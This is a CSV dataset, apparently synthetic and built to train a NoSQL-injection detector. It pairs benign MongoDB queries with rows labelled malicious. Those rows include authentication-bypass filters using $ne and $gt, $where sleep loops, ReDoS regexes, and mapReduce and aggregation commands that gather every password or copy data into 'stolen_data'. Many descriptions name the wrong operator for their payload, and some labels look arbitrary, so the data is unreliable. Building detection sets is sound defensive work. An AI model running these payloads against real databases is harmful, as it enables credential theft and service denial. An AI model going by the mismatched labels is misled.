id,label,type,collection,query,full_command,description,timestamp
5889,benign,aggregation_query,sessions,"[{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}]","db.sessions.aggregate([{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.540868
5890,benign,simple_find,orders,"{""price"": 73.44}","db.orders.find({""price"": 73.44})",Simple field match query,2025-11-24T21:15:54.494277
5891,malicious,json_injection,users,"{""$comment"": ""malicious"", ""username"": ""admin""}","db.users.find({""$comment"": ""malicious"", ""username"": ""admin""})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.317541
5892,malicious,aggregation_injection,logs,"[{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}]","db.logs.aggregate([{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.291620
5893,malicious,operator_injection,accounts,"{""user_id"": {""$exists"": true, ""$ne"": null}}","db.accounts.find({""user_id"": {""$exists"": true, ""$ne"": null}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.359905
5894,benign,count_query,logs,"{""created_at"": {""$gte"": ""2025-11-19""}}","db.logs.countDocuments({""created_at"": {""$gte"": ""2025-11-19""}})",Document count query,2025-11-24T21:15:54.379419
5895,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(324).limit(11)",Query with pagination,2025-11-24T21:15:54.470872
5896,malicious,operator_injection,users,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.users.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.345685
5897,benign,insert_query,orders,"{""order_id"": ""f05fa9e7-0767-4b82-8a40-37eb0585d67d"", ""user_id"": ""c5dd5f8b-562e-443f-9486-8d2d741c3cde"", ""total"": 274.55, ""status"": ""shipped"", ""created_at"": ""2025-11-14T14:38:42.052519"", ""items_count"": 9}","db.orders.insertOne({""order_id"": ""f05fa9e7-0767-4b82-8a40-37eb0585d67d"", ""user_id"": ""c5dd5f8b-562e-443f-9486-8d2d741c3cde"", ""total"": 274.55, ""status"": ""shipped"", ""created_at"": ""2025-11-14T14:38:42.052519"", ""items_count"": 9})",Document insert operation,2025-11-24T21:15:54.489961
5898,benign,find_with_projection,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.485596
5899,benign,distinct_query,articles,"{""field"": ""category""}","db.articles.distinct(""category"")",Field distinct query,2025-11-24T21:15:54.488032
5900,malicious,array_injection,users,"{""id"": {""$size"": {""$gt"": 0}}}","db.users.find({""id"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.308570
5901,malicious,comment_injection,sessions,"{""$comment"": ""/*"", ""username"": ""*/admin""}","db.sessions.find({""$comment"": ""/*"", ""username"": ""*/admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.342624
5902,malicious,json_injection,orders,"{""$comment"": ""malicious"", ""username"": ""admin""}","db.orders.find({""$comment"": ""malicious"", ""username"": ""admin""})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.291856
5903,benign,simple_find,customers,"{""category"": ""books""}","db.customers.find({""category"": ""books""})",Simple field match query,2025-11-24T21:15:54.515596
5904,benign,aggregation_query,logs,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.logs.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.465872
5905,benign,simple_find,users,"{""name"": ""Steven Roberts""}","db.users.find({""name"": ""Steven Roberts""})",Simple field match query,2025-11-24T21:15:54.370225
5906,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(147).limit(10)",Query with pagination,2025-11-24T21:15:54.366251
5907,malicious,operator_injection,orders,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.orders.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.341699
5908,malicious,operator_injection,products,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.products.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.335903
5909,malicious,mapreduce_injection,transactions,"{""mapreduce"": ""transactions"", ""map"": ""function() { emit(this._id, this.password); }"", ""reduce"": ""function(key, values) { return values.join(','); }"", ""out"": ""attack_results""}","db.runCommand({""mapreduce"": ""transactions"", ""map"": ""function() { emit(this._id, this.password); }"", ""reduce"": ""function(key, values) { return values.join(','); }"", ""out"": ""attack_results""})",Executing malicious JavaScript through MapReduce,2025-11-24T21:15:54.315860
5910,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(78).limit(26)",Query with pagination,2025-11-24T21:15:54.398809
5911,malicious,regex_injection,customers,"{""name"": {""$regex"": "".{1,1000000}""}}","db.customers.find({""name"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.328867
5912,benign,find_with_projection,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.531977
5913,malicious,operator_injection,transactions,"{""password"": {""$gt"": """"}}","db.transactions.find({""password"": {""$gt"": """"}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.359967
5914,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.379142
5915,benign,find_with_sort,users,{},"db.users.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.408950
5916,malicious,or_injection,products,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.products.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.304346
5917,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(396).limit(47)",Query with pagination,2025-11-24T21:15:54.565533
5918,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(336).limit(27)",Query with pagination,2025-11-24T21:15:54.415970
5919,malicious,where_injection,users,"{""$where"": ""function() { sleep(5000); return true; }""}","db.users.find({""$where"": ""function() { sleep(5000); return true; }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.296007
5920,benign,insert_query,products,"{""name"": ""Reverse-engineered object-oriented function"", ""price"": 937.64, ""category"": ""books"", ""stock"": 577, ""rating"": 2.1, ""brand"": ""Malone, Lopez and Jacobson""}","db.products.insertOne({""name"": ""Reverse-engineered object-oriented function"", ""price"": 937.64, ""category"": ""books"", ""stock"": 577, ""rating"": 2.1, ""brand"": ""Malone, Lopez and Jacobson""})",Document insert operation,2025-11-24T21:15:54.488469
5921,malicious,regex_injection,sessions,"{""email"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.sessions.find({""email"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.332823
5922,malicious,or_injection,accounts,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.accounts.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.307287
5923,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(8).limit(75)",Query with pagination,2025-11-24T21:15:54.457939
5924,malicious,regex_injection,transactions,"{""username"": {""$regex"": ""^.*$"", ""$options"": ""s""}}","db.transactions.find({""username"": {""$regex"": ""^.*$"", ""$options"": ""s""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.345839
5925,benign,find_with_projection,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.407038
5926,malicious,or_injection,customers,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.customers.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.355150
5927,malicious,regex_injection,customers,"{""name"": {""$regex"": ""^.*$"", ""$options"": ""s""}}","db.customers.find({""name"": {""$regex"": ""^.*$"", ""$options"": ""s""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.340664
5928,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.401033
5929,malicious,where_injection,accounts,"{""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""}","db.accounts.find({""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.303486
5930,malicious,or_injection,logs,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.logs.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.324770
5931,benign,find_with_projection,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.390237
5932,benign,aggregation_query,users,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.users.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.457815
5933,benign,simple_find,customers,"{""category"": ""electronics""}","db.customers.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.534474
5934,malicious,regex_injection,products,"{""username"": {""$regex"": "".*""}}","db.products.find({""username"": {""$regex"": "".*""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.311048
5935,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(14).limit(10)",Query with pagination,2025-11-24T21:15:54.446560
5936,benign,simple_find,articles,"{""_id"": ""84b9cc5a-4098-40ba-9d00-841e55d56d09""}","db.articles.find({""_id"": ""84b9cc5a-4098-40ba-9d00-841e55d56d09""})",Simple field match query,2025-11-24T21:15:54.526714
5937,malicious,regex_injection,customers,"{""user_id"": {""$regex"": "".*""}}","db.customers.find({""user_id"": {""$regex"": "".*""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.306972
5938,benign,find_with_limit,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}).skip(232).limit(81)",Query with pagination,2025-11-24T21:15:54.539422
5939,malicious,operator_injection,customers,"{""password"": {""$lt"": """"}}","db.customers.find({""password"": {""$lt"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.294090
5940,malicious,operator_injection,customers,"{""_id"": {""$ne"": null}}","db.customers.find({""_id"": {""$ne"": null}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.303689
5941,malicious,where_injection,sessions,"{""$where"": ""this.password.length > 0""}","db.sessions.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.350635
5942,malicious,operator_injection,transactions,"{""password"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.transactions.find({""password"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.334242
5943,malicious,where_injection,customers,"{""$where"": ""function() { sleep(5000); return true; }""}","db.customers.find({""$where"": ""function() { sleep(5000); return true; }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.323539
5944,malicious,operator_injection,logs,"{""username"": ""allison96"", ""password"": {""$ne"": """"}}","db.logs.find({""username"": ""allison96"", ""password"": {""$ne"": """"}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.290559
5945,malicious,operator_injection,products,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.products.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.294664
5946,malicious,regex_injection,accounts,"{""user_id"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.accounts.find({""user_id"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.304746
5947,malicious,or_injection,transactions,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.transactions.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.357485
5948,malicious,operator_injection,orders,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.orders.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.353130
5949,malicious,where_injection,users,"{""$where"": ""function() { return this.role == 'admin' }""}","db.users.find({""$where"": ""function() { return this.role == 'admin' }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.299768
5950,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.529123
5951,malicious,or_injection,transactions,"{""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]}","db.transactions.find({""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.292273
5952,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.478909
5953,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.436180
5954,benign,simple_find,articles,"{""username"": ""qiuguiying""}","db.articles.find({""username"": ""qiuguiying""})",Simple field match query,2025-11-24T21:15:54.368468
5955,malicious,type_confusion,accounts,"{""role"": []}","db.accounts.find({""role"": []})",Exploiting type system for injection attack,2025-11-24T21:15:54.356577
5956,malicious,where_injection,transactions,"{""$where"": ""this.password.length > 0""}","db.transactions.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.346711
5957,malicious,operator_injection,accounts,"{""status"": {""$regex"": "".*""}}","db.accounts.find({""status"": {""$regex"": "".*""}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.315256
5958,malicious,array_injection,transactions,"{""user_id"": {""$size"": {""$gt"": 0}}}","db.transactions.find({""user_id"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.289570
5959,malicious,array_injection,users,"{""username"": {""$size"": {""$gt"": 0}}}","db.users.find({""username"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.344468
5960,benign,find_with_sort,comments,{},"db.comments.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.439256
5961,benign,count_query,products,"{""created_at"": {""$gte"": ""2025-11-09""}}","db.products.countDocuments({""created_at"": {""$gte"": ""2025-11-09""}})",Document count query,2025-11-24T21:15:54.365635
5962,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.441894
5963,malicious,or_injection,accounts,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.accounts.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.346946
5964,malicious,or_injection,logs,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.logs.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.317181
5965,malicious,regex_injection,accounts,"{""role"": {""$regex"": ""^(?:a+){10,}$""}}","db.accounts.find({""role"": {""$regex"": ""^(?:a+){10,}$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.295511
5966,benign,simple_find,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""})",Simple field match query,2025-11-24T21:15:54.386938
5967,malicious,operator_injection,orders,"{""role"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.orders.find({""role"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.319804
5968,benign,simple_find,users,"{""category"": ""electronics""}","db.users.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.460552
5969,benign,simple_find,comments,"{""_id"": ""aeca599c-ee88-4132-a523-0758d99a0673""}","db.comments.find({""_id"": ""aeca599c-ee88-4132-a523-0758d99a0673""})",Simple field match query,2025-11-24T21:15:54.554977
5970,benign,find_with_projection,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.401627
5971,benign,distinct_query,products,"{""field"": ""category""}","db.products.distinct(""category"")",Field distinct query,2025-11-24T21:15:54.418286
5972,benign,distinct_query,orders,"{""field"": ""country""}","db.orders.distinct(""country"")",Field distinct query,2025-11-24T21:15:54.414916
5973,malicious,or_injection,customers,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.customers.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.318668
5974,benign,update_query,sessions,"{""filter"": {""_id"": ""8b300329-f55c-42c6-a8c5-eddc3253f9fa""}, ""update"": {""$inc"": {""view_count"": 1}}}","db.sessions.updateOne({""_id"": ""8b300329-f55c-42c6-a8c5-eddc3253f9fa""}, {""$inc"": {""view_count"": 1}})",Document update operation,2025-11-24T21:15:54.462579
5975,malicious,regex_injection,customers,"{""password"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.customers.find({""password"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.292016
5976,malicious,operator_injection,sessions,"{""_id"": {""$ne"": null}}","db.sessions.find({""_id"": {""$ne"": null}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.316115
5977,malicious,where_injection,logs,"{""$where"": ""function() { var x = this.password; return x.match(/.*/) }""}","db.logs.find({""$where"": ""function() { var x = this.password; return x.match(/.*/) }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.329152
5978,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(117).limit(50)",Query with pagination,2025-11-24T21:15:54.567585
5979,benign,insert_query,products,"{""name"": ""Ergonomic object-oriented website"", ""price"": 68.27, ""category"": ""electronics"", ""stock"": 212, ""rating"": 4.5, ""brand"": ""Ellison, Smith and Grimes""}","db.products.insertOne({""name"": ""Ergonomic object-oriented website"", ""price"": 68.27, ""category"": ""electronics"", ""stock"": 212, ""rating"": 4.5, ""brand"": ""Ellison, Smith and Grimes""})",Document insert operation,2025-11-24T21:15:54.546780
5980,benign,find_with_projection,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.430663
5981,malicious,json_injection,accounts,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.accounts.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.299357
5982,benign,aggregation_query,users,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.users.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.392051
5983,malicious,regex_injection,sessions,"{""name"": {""$regex"": ""^(a|a)+$""}}","db.sessions.find({""name"": {""$regex"": ""^(a|a)+$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.340593
5984,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.399321
5985,malicious,mapreduce_injection,transactions,"{""mapreduce"": ""transactions"", ""map"": ""function() { var x = db.users.find().toArray(); emit(1, x); }"", ""reduce"": ""function(key, values) { db.stolen.insert({data: values}); return 1; }"", ""out"": ""attack_results""}","db.runCommand({""mapreduce"": ""transactions"", ""map"": ""function() { var x = db.users.find().toArray(); emit(1, x); }"", ""reduce"": ""function(key, values) { db.stolen.insert({data: values}); return 1; }"", ""out"": ""attack_results""})",Executing malicious JavaScript through MapReduce,2025-11-24T21:15:54.296725
5986,malicious,operator_injection,transactions,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.transactions.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.356703
5987,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(422).limit(11)",Query with pagination,2025-11-24T21:15:54.519763
5988,benign,find_with_sort,users,{},"db.users.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.494185
5989,benign,find_with_limit,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}).skip(18).limit(47)",Query with pagination,2025-11-24T21:15:54.498358
5990,benign,aggregation_query,comments,"[{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}]","db.comments.aggregate([{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}])",Aggregation pipeline query,2025-11-24T21:15:54.491636
5991,benign,simple_find,users,"{""name"": ""Andrea Robinson""}","db.users.find({""name"": ""Andrea Robinson""})",Simple field match query,2025-11-24T21:15:54.529552
5992,benign,find_with_sort,products,{},"db.products.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.392386
5993,benign,aggregation_query,sessions,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.sessions.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.413714
5994,benign,find_with_projection,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.373432
5995,benign,aggregation_query,orders,"[{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}]","db.orders.aggregate([{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}])",Aggregation pipeline query,2025-11-24T21:15:54.556966
5996,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.519979
5997,benign,find_with_limit,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}).skip(427).limit(70)",Query with pagination,2025-11-24T21:15:54.385865
5998,malicious,or_injection,products,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.products.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.339211
5999,malicious,where_injection,transactions,"{""$where"": ""this.password.length > 0""}","db.transactions.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.338771
6000,benign,aggregation_query,sessions,"[{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}]","db.sessions.aggregate([{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}])",Aggregation pipeline query,2025-11-24T21:15:54.417791
6001,malicious,regex_injection,customers,"{""role"": {""$regex"": ""admin.*"", ""$options"": ""i""}}","db.customers.find({""role"": {""$regex"": ""admin.*"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.290793
6002,malicious,json_injection,customers,"{""username.__proto__.admin"": true}","db.customers.find({""username.__proto__.admin"": true})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.342258
6003,benign,insert_query,products,"{""name"": ""Optimized content-based portal"", ""price"": 401.96, ""category"": ""clothing"", ""stock"": 52, ""rating"": 3.8, ""brand"": ""Spencer Inc""}","db.products.insertOne({""name"": ""Optimized content-based portal"", ""price"": 401.96, ""category"": ""clothing"", ""stock"": 52, ""rating"": 3.8, ""brand"": ""Spencer Inc""})",Document insert operation,2025-11-24T21:15:54.486633
6004,malicious,type_confusion,logs,"{""status"": {""$not"": {""$type"": 10}}}","db.logs.find({""status"": {""$not"": {""$type"": 10}}})",Exploiting type system for injection attack,2025-11-24T21:15:54.315426
6005,malicious,aggregation_injection,users,"[{""$group"": {""_id"": null, ""passwords"": {""$push"": ""$password""}}}]","db.users.aggregate([{""$group"": {""_id"": null, ""passwords"": {""$push"": ""$password""}}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.317571
6006,malicious,or_injection,customers,"{""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]}","db.customers.find({""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.327348
6007,malicious,json_injection,sessions,"{""username.__proto__.admin"": true}","db.sessions.find({""username.__proto__.admin"": true})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.300021
6008,malicious,operator_injection,orders,"{""_id"": {""$ne"": null}}","db.orders.find({""_id"": {""$ne"": null}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.324422
6009,benign,simple_find,orders,"{""email"": ""xiulan74@example.com""}","db.orders.find({""email"": ""xiulan74@example.com""})",Simple field match query,2025-11-24T21:15:54.449906
6010,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.421919
6011,malicious,aggregation_injection,products,"[{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}]","db.products.aggregate([{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.296775
6012,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(32).limit(50)",Query with pagination,2025-11-24T21:15:54.434397
6013,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.462933
6014,malicious,regex_injection,transactions,"{""password"": {""$regex"": ""(a+)+$""}}","db.transactions.find({""password"": {""$regex"": ""(a+)+$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.331920
6015,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.497907
6016,benign,insert_query,products,"{""name"": ""Vision-oriented real-time approach"", ""price"": 416.24, ""category"": ""food"", ""stock"": 918, ""rating"": 3.0, ""brand"": ""Solomon-Thomas""}","db.products.insertOne({""name"": ""Vision-oriented real-time approach"", ""price"": 416.24, ""category"": ""food"", ""stock"": 918, ""rating"": 3.0, ""brand"": ""Solomon-Thomas""})",Document insert operation,2025-11-24T21:15:54.492506
